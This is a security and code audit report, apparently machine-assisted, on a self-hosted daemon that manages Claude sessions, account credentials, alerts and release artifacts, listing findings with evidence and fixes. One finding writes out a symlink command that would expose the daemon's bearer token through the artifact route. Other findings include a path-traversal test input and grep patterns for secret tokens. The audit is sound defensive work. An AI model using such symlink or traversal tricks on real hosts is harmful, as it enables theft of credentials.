### `server/appd/huginn-appd.js:1834`

The journal captures fragments of live Claude session content — 40 chars of every prompt question and 60-80 chars of every answer label — which is real conversation data leaving the process into a persisted, backed-up log; the 47 lines present today happen to be benign.

**lane** appd secrets hygiene, credential handling, and host hardening · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** No exposure demonstrated. The mechanism is worth knowing because it is unbounded by design: whatever a Claude session happens to be asking about at the moment an alert enriches is copied verbatim (first 40 chars) into a journal that is persisted under /var/log/journal, rides the container backup offsite, and is never redacted. A session prompting 'Use key sk-... to reach the ... API?' would put its first 40 characters in the log with no code change required. /var/log/journal is root:systemd-journal 2755 and the systemd-journal group has no members, and root is the only login-capable account on the host, so there is no local reader today.

<details><summary>Evidence</summary>

```
huginn-appd.js:1834 `log(`alerts: enriched ${a.subject} q=${JSON.stringify((a.question||'').slice(0,40))} opts=${(a.options||[]).length}`);` and :2814 `log(`answer: ${name} <- ${option} (${chosen.label.slice(0, 60)})`);` plus :2795 for the multi-select variant (`labels.join(', ').slice(0, 80)`). RAN over the full 170445-line unit journal: 20 `alerts: enriched` lines and 27 `answer:` lines. Their actual content is harmless — `q="Deploy the new build to production?"`, `answer: actq <- 2 (No)`, `answer: audit-fp-probe <- 2 (Yes, and do not ask again)`. Also 11 lines carry account email addresses (`account switched: <EMAIL> -> <EMAIL>`, `sign-in completed as <EMAIL>`). CRITICALLY, the secret census is CLEAN: grep of the same journal for `sk-ant-oat`, `sk-ant-ort`, `refreshToken`, `accessToken`, `BEGIN PRIVATE KEY` and `Bearer ` returns 0 hits each — no token, refresh token, FCM key or Authorization header value has ever reached the log. I also checked the one plausible indirect leak, `trySender`'s `log(`push: FCM not configured (${e.message})`)` with a corrupt key file, and confirmed Node's JSON.parse messages embed at most ~10 leading bytes (`Unexpected token 'x', "x{"client_"... is not valid JSON`) — i.e. the `{"type": "` prefix, never key material.
```

</details>

**Suggested fix:** If it is worth closing, log the prompt fingerprint (already computed at :1832 as `a.fingerprint = promptFingerprint(prompt)`) and the option count instead of the question text, and log the option NUMBER without the label at :2795/:2814 — every one of those lines exists for correlation, which a fingerprint serves as well as the text does. Leave the email lines; they are the whole point of an account-switch log entry and are not credentials.

### `server/appd/huginn-appd.js:2039`

Verified clean, no defect: no route returns a secret, the token comparison is constant-time, the credential-file write path is the documented switching feature only, and all secret-bearing files on disk carry correct restrictive modes.

**lane** appd secrets hygiene, credential handling, and host hardening · **contract** C8 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** None — this entry records what was checked and found sound so the coverage map does not show these as unexamined. The two genuine mode/lifetime problems are filed separately above (chat files 0644 in a 0755 tree; superseded never pruned); everything else in the secrets surface is correct as written.

<details><summary>Evidence</summary>

```
Enumerated all 28 routes by grep. `/v1/status` (statusPayload, :1392-1416) returns host/appdVersion/uptime/load/cores/claude version/mempalace/disk/session counts — no secrets. `/v1/push` (:2079-2094) deliberately strips the FCM registration token (`devices: pushLib.list(st).map(({ token, ...rest }) => ({ ...rest, tokenTail: token.slice(-8) }))` with the comment `Never the token itself`) and exposes only projectId and the service-account email, neither of which is a credential. `/v1/plan` and `/v1/accounts` return percentages, emails, uuids and timestamps — `accounts.list()` (:450-475) builds rows field-by-field and `describe()` (:113-120) returns only subscriptionType/expiresAt/scope COUNT, so credentials cannot ride along. `authorized()` (:151-158) uses `crypto.timingSafeEqual` behind a length equality check; RAN against a scratch daemon: no header -> 401, wrong token -> 401, correct token -> 200. TOKEN is read once at startup and rejected below 32 chars (:145-149). Child processes get `{ ...process.env, TERM: 'dumb' }` (:830) and the token/FCM key are file-loaded into JS consts, never env, so no secret is inherited by spawned claude/tmux. On the write side: the ONLY writer to ~/.claude/.credentials.json is lib/accounts.js:496-498 inside `activate()` — the account-switch feature — and the only reads are `readActive()` (:170) and the direct read in `fetchPlan` (:1291); there is no refresh-flow write, consistent with C8's 'implements NO OAuth refresh flow deliberately' (:1195-1197 and lib/autoswitch.js:32-33 both say so explicitly). RAN, modes/owners only: /etc/huginn-appd drwx------ root:root with token -rw------- (65 B) and fcm-service-account.json -rw------- (2371 B); /root/.claude/.credentials.json and /root/.claude.json both -rw------- root:root; /var/lib/huginn-appd drwx------; accounts/ and accounts/superseded/ drwx------ with every profile -rw-------; alerts.json/clients.json/push.json/autoswitch.json all -rw-------; uploads/ files -rw-------. Also confirmed lib/desktop.js's traversal defence is genuine — `NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]{1,80}$/` admits no separator, so the `decodeURIComponent(m[1])` at the two artifact routes cannot escape the channel directory.
```

</details>

**Suggested fix:** No change required. Optional consistency nit only: lib/desktop.js:24-25 uses bare `require('fs')`/`require('path')` while all 22 other builtin requires in the tree use the `node:` prefix — core resolution wins either way, so this is cosmetic.

### `server/appd/huginn-appd.js:2119`

Several server-emitted diagnostic fields are read by no client — autoswitch threshold + idleBecause, saved-account planLive/planAgeSec, and chat-SSE result.turns — so the 'why autoswitch did nothing' explanation and the stale-vs-live plan distinction are invisible on every surface.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Autoswitch sits idle because every candidate is above threshold (idleBecause says so); the owner opens Settings on either client, sees only 'autoswitch on · N accounts' and a days-old weekly % presented as current, and picks an account on stale data — the very field added to prevent that is never displayed.

<details><summary>Evidence</summary>

```
Live GET /v1/autoswitch returns ['accounts','enabled','idleBecause','last','switches','threshold'] (RAN IT), but the Kotlin Autoswitch model (Models.kt:187) decodes only enabled/switches/last/accounts and both Settings UIs render only those (SettingsView.kt:403 autoswitchLine, SettingsScreen.kt:340). GET /v1/accounts?plan=1 sets a.planLive/a.planAgeSec (huginn-appd.js:2358-2360, "Said plainly via planAgeSec rather than passed off as live") — SavedAccount (Models.kt:418) omits both, and both UIs print weeklyPercent unqualified. handleClaudeEvent emits result.turns (line 963); both decoders drop it. POST /v1/autoswitch also reads a `threshold` no client ever sends (curl-only tunable, as its comment intends).
```

</details>

**Suggested fix:** Add threshold/idleBecause to the Kotlin Autoswitch model and Settings line, and planAgeSec to SavedAccount with an '(as of Nh ago)' qualifier — or consciously delete the fields server-side.

### `server/appd/huginn-appd.js:2170`

routeAlerts implements and tests a 'off' mode that POST /v1/alerts cannot set, and an unrecognised mode is silently ignored while the response echoes the unchanged value as if it had been accepted.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified

**What goes wrong:** A future client (or a curl from the owner) posts {"mode":"off"} to silence Telegram while keeping push. The daemon returns 200 with mode:"fallback", the setting appears to have been accepted, and Telegram keeps firing whenever the app looks unreachable. Not currently reachable from any shipped UI, hence INFO — but it is a silently-ignored write, which is the shape of the settings bugs already fixed in this codebase.

<details><summary>Evidence</summary>

```
huginn-appd.js:2170 — `if (body.mode === 'fallback' || body.mode === 'always') st.mode = body.mode;` then line 2174 returns `{ enabled: !!st.enabled, mode: st.mode || 'fallback' }`. lib/alerts.js:263 handles `if (mode === 'off') return { deliver: [], held: alerts.slice() };` and test/alerts.test.js:164-167 covers it. No shipped client offers it — SettingsScreen.kt:257-258 only toggles between 'fallback' and 'always'.
```

</details>

**Suggested fix:** Either accept 'off' (it is already implemented and tested downstream) or return 400 for an unrecognised mode instead of echoing the old one.

### `server/appd/huginn-appd.js:3199`

The SIGTERM/SIGINT handler exits without calling flushClients(), discarding up to 60s of client check-in state on every deploy/restart.

**lane** appd async ordering, state persistence, and concurrency · **verdict** not separately verified

**What goes wrong:** Deploy restarts the daemon 59s after the last flush: recent check-ins (lastAt updates, notify flags) are lost; a stream client's lastAt reads up to 60s staler than reality immediately after startup, marginally biasing appOnline toward false and Telegram toward duplicating during the first minutes after a deploy.

<details><summary>Evidence</summary>

```
3194-3201: the handler awaits sweepStrandedSizes then `process.exit(0)`; clientState is only persisted by the 60s interval (`setInterval(flushClients, CLIENT_FLUSH_MS).unref()` at 1451), whose stated purpose (1431-1433) is 'so a daemon restart does not make every phone look newly-arrived'.
```

</details>

**Suggested fix:** Call flushClients() (it is synchronous) inside the shutdown handler before process.exit(0).

### `server/appd/lib/accounts.js:405`

Lane question answered: the 16-hex record 964aefae83ccf2ba.json is the THIRD real account (unique email, unique refresh token — not a duplicate), and it will never be auto-reconciled to a uuid name, but exactly one row survives, so no duplicate entry persists.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **contract** C8 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not a defect in itself; the residual risk: activating it installs 8-day-old credentials whose refresh token may have rotated out — if dead, the host is left signed in with unusable credentials until a manual `claude auth login`, and the app's only hints are verified:false/planLive:false with no explicit 'this may no longer authenticate' warning.

<details><summary>Evidence</summary>

```
RAN IT: store inspection shows 3 records with 3 distinct emails and 3 distinct refresh tokens (compared as booleans, no values). The fp record (saved 2026-07-27, pre-uuid-era) has accountUuid:false AND oauthAccount:false, so storedUuid() returns null and consolidate() line 405 `if (!uuid) continue; // unidentifiable: leave it exactly as it is` skips it; the /v1/accounts identity loop needs its own token to answer and it expired 2026-07-27 (resolveIdentity 401 -> `continue`, line 2313); migrate() sees a single record already named by its own print -> settled. Live /v1/accounts confirms it lists once: verified:false, duplicateOf:false. Its oauthAccount is absent because save() captures the block only when the creds are live and ~/.claude.json had none at that switch-away moment.
```

</details>

**Suggested fix:** None required for correctness (conservative-keep is the design). Optional: age-flag records whose token expired >N days ago in /v1/accounts, and have the clients caption them 'may need re-sign-in'.

### `server/appd/lib/accounts.js:497`

Contract C8's clause '~/.claude/.credentials.json is read-only, always' is contradicted as written by the switching feature itself: activate() replaces the file (atomically) by design — the contract text should say 'no in-place token mutation / no refresh writes; whole-file swap only on an explicit switch'.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **contract** C8 · **verdict** not separately verified

**What goes wrong:** None — this is a contract-wording correction so future audits do not misflag activate() as a violation, plus the positive atomicity answer the lane asked for.

<details><summary>Evidence</summary>

```
activate() lines 496-498: `fs.writeFileSync(tmp, JSON.stringify(rec.credentials), { mode: 0o600 }); fs.renameSync(tmp, this.credentialsPath);`. Atomicity verified by reading: tmp lives in the same directory (same-fs rename), the write+rename pair has no await between them (cannot interleave with a concurrent switch in one process), the outgoing snapshot happens BEFORE the swap, and a crash at any point leaves either the old file intact or the new file complete plus at worst a stale oauthAccount block in ~/.claude.json that the CLI re-derives — never a missing or truncated credentials file. No OAuth refresh flow exists anywhere (grep over appd shows refreshToken used only for fingerprint/equality), satisfying C8's no-refresh clause.
```

</details>

**Suggested fix:** Reword C8: 'the daemon never mutates tokens in place and implements no refresh flow; the credentials file is replaced only wholesale, atomically, during activate()'.

### `server/appd/lib/desktop.js:54`

Artifact integrity is entirely client-side, and the Electron channel's manifest sha256 values are read by nothing at all.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** No live failure. The concrete risk it documents: a partial or corrupted file in /var/lib/huginn-appd/desktop (a truncated `install` during a full disk — the filesystem is at 80%) would be served with a 200 and a matching Content-Length, and on the Electron channel only latest.yml's sha512 stands between that and an install. If someone later 'simplifies' by trusting manifest.json's sha256 on the Electron side, they would be trusting a field nothing has ever validated against the bytes on disk.

<details><summary>Evidence</summary>

```
readManifest (lib/desktop.js:54-60) parses and returns the JSON verbatim; the route (huginn-appd.js:2839-2843) sends it. Neither the library nor the daemon ever hashes an artifact — there is no `crypto` use in lib/desktop.js.

Who verifies, per channel:
- /v1/desktop-kt: verified. DesktopUpdater.kt:191/207 `Sha256.matches(dest, artifact.sha256)` and :209 discards a mismatch; release-desktop.sh:399 runs :app-desktop:updaterProbe as a release gate.
- /v1/desktop: `grep -rn sha256 /opt/huginn/desktop/src` returns NOTHING. electron-updater verifies the sha512 in latest.yml instead, so the three sha256 fields in /var/lib/huginn-appd/desktop/manifest.json (for the AppImage, deb and exe) are written by release.sh and read by no program on either side.

So integrity is covered on both channels, but by two different digests in two different files, and the manifest's own sha256 is decorative on the Electron side.
```

</details>

**Suggested fix:** Either drop the unread sha256 block from the Electron manifest, or have the /v1/desktop*/manifest route verify the on-disk sizes against the manifest's `size` fields and 503 on divergence — cheap, and it catches a half-staged release before a client downloads it.

### `server/appd/lib/desktop.js:80`

resolveArtifact follows symlinks (statSync, not lstatSync), so any symlink planted in a channel directory is served as an artifact — not currently exploitable, since only root can write there.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not reachable today. It becomes reachable the moment anything non-root can create a file in a channel dir — e.g. if a future release script runs as a build user, or DATA_DIR is loosened from 0700. At that point `ln -s /etc/huginn-appd/token .../desktop/Huginn-Setup-9.9.9.exe` turns the authenticated artifact route into a read of the bearer token. Recording it so the 0700 parent is understood as the actual control, rather than the name regex.

<details><summary>Evidence</summary>

```
lib/desktop.js:80 `try { st = fs.statSync(file); }` — statSync dereferences; `st.isFile()` is therefore true for a symlink to a regular file. The header comment's claim "there is no realpath check behind it because there is nothing for one to catch" is true for traversal but not for links.

RAN:
  $ ln -s /etc/hostname sym/Evil-1.0.0.exe
  $ node -e "...resolveArtifact('.../sym','Evil-1.0.0.exe')"
  {"ok":true,"file":".../sym/Evil-1.0.0.exe","contentType":"application/octet-stream","size":7}

Current permissions make this unreachable: /var/lib/huginn-appd is `drwx------ root root`, both channel dirs are 755 inside it, and all artifacts are 0644 root. Nothing in the daemon writes to either directory (verified: the only writers are the two release scripts, run as root).
```

</details>

**Suggested fix:** Use `fs.lstatSync` and reject non-regular files, or `fs.realpathSync` the joined path and assert it still starts with `dir + path.sep`. Either makes the directory permissions a second line of defence rather than the only one.

### `server/appd/lib/gtoken.js:1`

Full coverage map for both trees. The '19 lib modules / 18 test files' gap is gtoken.js, but it is NOT a real gap — it is covered from fcm.test.js; the genuine appd hole is huginn-appd.js itself, and on the Kotlin side it is :ui (7 tests for 8 files) plus :app-desktop's controllers and notifier backends.

**lane** test coverage map — find the next TermKeys · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not a defect — this is the map. Its operational consequence: the two highest-privilege surfaces in the ecosystem (huginn-appd.js, which holds the token, the tmux control plane and the account store; and :app-desktop's notifier/lease controllers, which own the household's alerting fallback and the owner's terminal geometry) are the two with the least test coverage, and the appd deploy path runs no tests at all.

<details><summary>Evidence</summary>

```
APPD — 385 tests / 0 skipped / 0 failed, verified by `node --test test/*.test.js`; per-file: pane 67, alerts 56, transcript 55, accounts 40, autoswitch 19, pushtokens 19, fcm 17, watch 16, clients 14, tasks 14, uploads 11, models 10, suggest 10, chatqueue 9, agents 7, desktop 7, plan 7, usage 7 = 385 exactly (the reported count is honest).
Module -> test: accounts/agents/alerts/autoswitch/chatqueue/clients/desktop/fcm/models/pane/plan/pushtokens/suggest/tasks/transcript/uploads/usage/watch all have a dedicated file. gtoken.js has none BUT is exercised by test/fcm.test.js:10 (`require('../lib/gtoken')`) — 5 tests covering buildAssertion claims, the token cache, the EXPIRY_MARGIN refresh, a rejected exchange, and a malformed key file. Real per-module holes inside tested modules: agents.listAgents + agents.agentLastLine (used by daemon, 0 test refs), models.discoverModels (used by daemon, 0 test refs). huginn-appd.js: 0 tests, ~70 functions, 28 /v1 route branches, no exports.
KOTLIN — real counts from build/test-results/**/*.xml, all skipped=0 failures=0: :core jvmTest 233 (23 classes), :core testDebugUnitTest 233 (same classes, 2nd target), :app testDebugUnitTest 49 (9 classes), :ui jvmTest 7 (1 class), :app-desktop test 188 (24 classes). Distinct 477.
  :core (28 main files) — well covered; symbol-level holes: ModelLabels (0 refs anywhere), Platform.*/huginnHttpEngine (legit expect/actual), TermGrid, and most of Models.kt's 40 DTOs (only exercised indirectly via :app's ApiContractTest fixtures).
  :ui (8 main files, 1 test class) — TerminalCanvas only. Untested: Follow.kt (FollowNewest/NewestPill), TranscriptView.kt (14 symbols incl. the pure langForTool/resultLang and the private, unreachable answeredSummary), WorkViews.kt (WorkStrip/AgentCard/WorkDetail), MarkdownText.kt, SuggestionChips.kt, Theme.kt. Compose composables — expected; the pure helpers are not.
  :app (32 main files, 6 test classes) — expected UI gaps; notable non-UI gaps: SettingsStore, UriByteStream, HuginnMessagingService, SessionWatchWorker, WatchNotifier, AnswerReceiver, ReplyReceiver, and the C1 task-#20 shadows (prettyModel/prettyEffort/modelOptions/FALLBACK_MODELS, AutoScrollToNewest/JumpToNewest, WorkStrip/AgentRow) — 0 refs each.
  :app-desktop (58 main files, 14 test classes; tests are named by SUBJECT not by file, so WindowLayout/Splitter/Landing/Presence/Faults/Semver/Sha256/Updat
```

</details>

**Suggested fix:** Close in this order, cheapest-first: (1) gate deploy.sh on the existing suite; (2) ModelLabelsTest, ~10 lines, closes a documented past regression in two copies; (3) NotifyRouterTest, all collaborators are already lambdas; (4) re-capture the ApiContractTest fixtures; (5) add `require.main` + exports to huginn-appd.js and test validKey/canonName/authorized; (6) give HuginnClient an interface seam so PaneLeaseHolder becomes testable.

### `server/appd/lib/pane.js:126`

MAX_FOOTER_LINES=4 leaves only 2 lines of headroom over today's live plan-approval footer, so the 2026-08-03 silent-blindness mode returns if Claude Code adds 3 footer lines.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **contract** C2 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A cosmetic Claude Code update adds three footer rows under the plan dialog (e.g. a second hint row, a token count, a keybinding row): plan approvals silently stop being detected again, with no error anywhere — the exact failure 2.52.2 was shipped to end.

<details><summary>Evidence</summary>

```
The live plan footer already spends 2 of 4 ('shift+tab to approve with this feedback' and 'ctrl+g to edit in Vim · ~/.claude/plans/….md' — neither matches HINT_RE). Node demo E on the verbatim fixture: +2 extra unrecognized footer lines still detected, +3 => null.
```

</details>

**Suggested fix:** Add a canary regression test pinned to the current live footer plus 2 lines (so the margin is visible), and/or count only non-blank footer lines that are shorter than ~60 chars (help rows are short; prose is not).

### `server/appd/lib/transcript.js:207`

Performance on the largest real transcript (29.3MB) is healthy for tails — cold open 16.3ms, limit:1 title read 14.2ms, no-growth follow 0.0ms (the reader seeks, never whole-file) — but an explicit offset=0 request costs a 393ms synchronous event-loop stall, and the list endpoints re-read an uncached 256KB tail per chat/session per poll.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A buggy or hostile client (any bearer of the appd token) polling /transcript?offset=0 on a large session pins the single-threaded daemon ~400ms per request, stalling live typing and watch streams for all surfaces; separately, a chats list with many transcript-backed chats spends nChats x ~5-15ms of synchronous event-loop time per poll re-parsing unchanged tails.

<details><summary>Evidence</summary>

```
Ran timings on /root/.claude/projects/-root-netplan/326aef4b-*.jsonl (29.3MB): cold open (limit 400) 16.3ms / 51 events; limit:1 14.2ms; tail-follow no growth 0.0ms; offset=0 (limit 800) 392.6ms. The route (huginn-appd.js:2631) accepts any finite offset >= 0 from any token-holder; readTranscript is fully synchronous (readSync + JSON.parse) so a 0-offset poll blocks keystroke/pane traffic for ~400ms per request. listChats (huginn-appd.js:731) and the sessions preview (line 373) call readTranscript({limit:1}) per item per poll with no size-keyed cache (knownBackgroundIds at line 279 shows the intended pattern). Largest single line in the wild is 1.3MB — the MIN_TAIL_EVENTS doubling handles it (existing test covers).
```

</details>

**Suggested fix:** Clamp explicit offsets to a floor of size - N MB (or reject offset far below the tail window unless a full-export flag is set), and add a {size -> title/permissionMode} cache keyed like bgIdCache for the limit:1 list paths.

### `server/appd/test/desktop.test.js:1`

No test in server/appd/test exercises the route layer, the bearer gate, or readBody - the highest-privilege code in the daemon is covered only by lib-level unit tests.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A future refactor moves a route above the `if (!authorized(req))` line at 2033 - for example to add an unauthenticated /v1/health for Uptime-Kuma, placed at the top of the handler 'next to /v1/ping'. Every existing test still passes, deploy.sh's gate (`curl -sf .../v1/ping | grep -q '"ok":true'`) still passes, and a route on a 0.0.0.0-bound daemon that equals root-on-huginn is silently unauthenticated with nothing to catch it.

<details><summary>Evidence</summary>

```
RAN: `grep -rl "authorized|Bearer|readBody|createServer" /opt/huginn/server/appd/test/` -> NONE. The 18 test files all target lib/*: desktop.test.js covers resolveArtifact/validName (including 'traversal and separator shapes cannot pass') but nothing asserts that the ROUTE reaches it, that decodeURIComponent sits in front of it, or that the auth gate precedes routing at all. Every finding in this lane was reachable only by running the daemon by hand.
```

</details>

**Suggested fix:** Add server/appd/test/routes.test.js that boots the server module against a scratch HUGINN_APPD_DATA/TOKEN_FILE on an ephemeral port and asserts, with real counts: every route family returns 401 with no/short/wrong/lowercase-scheme tokens; /v1/desktop/%2e%2e%2f.. returns 400; an oversized body returns 413 not a reset; a malformed body returns 400 not 500. Extracting the handler into a `createHandler()` export would make this straightforward without changing behaviour.

### `server/setup.sh:82`

Neither setup.sh nor any provisioning doc installs, mentions, or generates credentials for huginn-appd — a host built exactly per the documented path cannot serve the phone or desktop clients at all.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Someone provisions a second Huginn host from provision/generic-host.md, installs the Android or Compose desktop client, and finds nothing to point it at: no daemon, no unit, no token, and no documentation saying one is needed. The CLI half works, the app half does not exist, with no diagnostic explaining the gap.

<details><summary>Evidence</summary>

```
setup.sh installs only cc, huginn-status, huginn-claude-title, tmux.conf and the Claude hooks (lines 38-70); its "Next steps" (lines 77-82) end at the client install. `grep -rn 'appd|8787|token' server/setup.sh provision/*.md docs/*.md` returns no hit in setup.sh or either provision doc, and docs/SETUP.md's "Server install" section lists exactly "Node, Claude Code, tmux, the cc launcher, huginn-status, and the tuned tmux.conf".
Meanwhile server/appd/deploy.sh:15 requires /etc/huginn-appd/token to already exist and :16 hardcodes 100.97.198.90, and huginn-appd.service is never installed or enabled by anything in the repo.
```

</details>

**Suggested fix:** Either add an appd install step to setup.sh (unit + `openssl rand -hex 32 > /etc/huginn-appd/token` with 0600 + enable) or document in docs/SETUP.md that appd is a separate, homelab-only deployment with its own path.

---

# Refuted — recorded so they are not rediscovered

- **`server/appd/lib/accounts.js:496`** (MED as filed) — An account switch can be silently undone by a still-running claude process writing its refreshed old-account tokens back over the credentials file, so the auto-switcher c
  
  *REFUTED (REFUTED:1)* — The half that is true — a running session keeps the old account until it restarts — is already documented at accounts.js:12-13 and, more importantly, is announced to the owner in the switch notification itself (huginn-appd.js:1751-1752), which is precisely the fix the finding proposes. The novel hal
